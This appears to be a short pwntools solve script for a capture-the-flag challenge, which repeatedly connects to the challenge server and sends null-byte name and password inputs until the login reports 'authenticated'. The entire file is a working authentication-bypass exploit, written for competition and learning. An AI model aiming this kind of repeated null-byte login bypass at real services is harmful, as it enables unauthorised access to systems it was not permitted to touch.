from pwn import *

# this doesn't seem to work on the hosted instance due to some kind of buffering problem with pwntools
# but if you host the challenge locally with docker it still works
# `solve.sh` works in all circumstances

for i in range(0, 1000):
	target = remote("pwn.ctf.secso.cc", 5004)
	target.recvuntil("Please enter your name!\n")
	target.send("\0"*0x40)
	target.recvuntil("password!\n")
	target.send("\0"*0x40)
	

	data = target.recvall()
	print(data)
	if b"authenticated" in data:
		print(target.recv())
		print(target.recv())
		break
	target.close()

